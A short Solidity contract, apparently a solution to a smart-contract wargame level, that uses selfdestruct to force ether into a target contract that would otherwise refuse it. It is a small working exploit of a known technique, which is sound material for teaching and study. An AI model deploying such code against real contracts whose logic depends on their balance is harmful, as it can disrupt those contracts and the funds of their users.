// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceHack {

    //function to allow receiving ether
    function deposit() external payable {}    

    function hack(address _force) public {
        selfdestruct(payable(_force));
    }
}